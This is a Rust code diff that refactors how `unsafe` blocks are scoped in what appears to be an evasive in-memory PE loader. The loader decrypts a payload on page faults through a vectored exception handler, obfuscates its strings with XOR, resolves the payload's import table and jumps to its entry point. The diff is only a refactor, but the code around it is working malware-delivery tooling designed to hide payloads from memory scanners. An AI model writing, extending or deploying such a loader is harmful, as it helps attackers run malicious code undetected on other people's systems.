@@ -122,24 +122,19 @@ fn run() -> Result<(), Box<dyn Error>> {
     // VEH should be registered after payload is copied to memory. Because,
     // if a page fault occurs at the payload memory region before the payload
     // is copied, page fault handler will just decrypt empty memory.
-    unsafe {
-        let handle = AddVectoredExceptionHandler(1, Some(page_fault_handler));
-        if handle.is_null() {
-            return Err(xor_string!("Failed to register VEH!").into());
-        }
+    let handle = unsafe { AddVectoredExceptionHandler(1, Some(page_fault_handler)) };
+    if handle.is_null() {
+        return Err(xor_string!("Failed to register VEH!").into());
     }
 
-    let payload_pe = unsafe {
-        parse_portable_executable(slice::from_raw_parts(
-            payload_base_addr as *const u8,
-            payload.len(),
-        ))
-        .map_err(|err| {
-            let mut temp = xor_string!("Couldn't parse the payload PE: ");
-            temp += err.to_string().as_str();
-            temp
-        })?
-    };
+    let payload_pe = parse_portable_executable(unsafe {
+        slice::from_raw_parts(payload_base_addr as *const u8, payload.len())
+    })
+    .map_err(|err| {
+        let mut temp = xor_string!("Couldn't parse the payload PE: ");
+        temp += err.to_string().as_str();
+        temp
+    })?;
 
     // ─── Resolve IAT ─────────────────────────────────────────────────────
     dprintln!("Resolving IAT...");
@@ -275,12 +270,10 @@ fn run() -> Result<(), Box<dyn Error>> {
     // ─── Run Payload ─────────────────────────────────────────────────────
     *PROTECTION_OVERRIDE.write()? = None;
 
-    unsafe {
-        let payload_entry_point = payload_base_addr + entry_point_rva as usize;
-        let payload_code: extern "C" fn() -> i32 = std::mem::transmute(payload_entry_point);
+    let payload_entry_point = payload_base_addr + entry_point_rva as usize;
+    let payload_code: extern "C" fn() -> i32 = unsafe { std::mem::transmute(payload_entry_point) };
 
-        payload_code();
-    }
+    payload_code();
 
     // ─── End ─────────────────────────────────────────────────────────────
     Ok(())
